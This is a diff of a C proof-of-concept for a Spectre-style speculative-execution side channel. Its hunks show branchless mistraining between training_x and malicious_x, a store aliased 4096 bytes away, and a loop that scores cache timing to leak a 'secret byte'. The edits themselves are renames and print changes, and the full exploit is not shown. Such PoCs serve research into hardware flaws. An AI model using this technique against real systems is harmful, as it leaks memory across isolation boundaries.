@@ -15,7 +15,7 @@ Victim code.
 #define jump_size 512
 #define four_k 4096
 #define dont_check 7
-const uint8_t secret_num = 43;
+const uint8_t secret_byte = 43;
 
 unsigned int array1_size = 16;
 uint8_t array2[256 * jump_size];
@@ -75,15 +75,16 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
       x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
       x = (x | (x >> 16));         /* Set x=-1 if j&6=0, else x=0 */
       x = training_x ^ (x & (malicious_x ^ training_x));
+
       // Value to store
       uint8_t value;
-      // The location to store is the address of the stored var
+      // The location to store is the address of the 'store' var
       uint8_t store;
       uint8_t *store_mal_ptr;
       if (x == malicious_x)
       {
         store_mal_ptr = (&store) + four_k;
-        value = secret_num;
+        value = secret_byte;
         is_mal = 51;
       }
       else
@@ -136,7 +137,6 @@ int main(int argc,
          const char **argv)
 {
   size_t malicious_x = (size_t)4064; /* default for malicious_x */
-  printf("First offset is %d\n", malicious_x);
   int i, score[2], len = 1;
   uint8_t value[2];
 
@@ -146,7 +146,7 @@ int main(int argc,
   printf("Reading %d bytes:\n", len);
   while (--len >= 0)
   {
-    printf("Reading at malicious_x = %p... ", (void *)malicious_x);
+    printf("Reading secret byte\t");
     readMemoryByte(malicious_x++, value, score);
     printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
     printf("0x%02X=%c score=%d ", value[0],
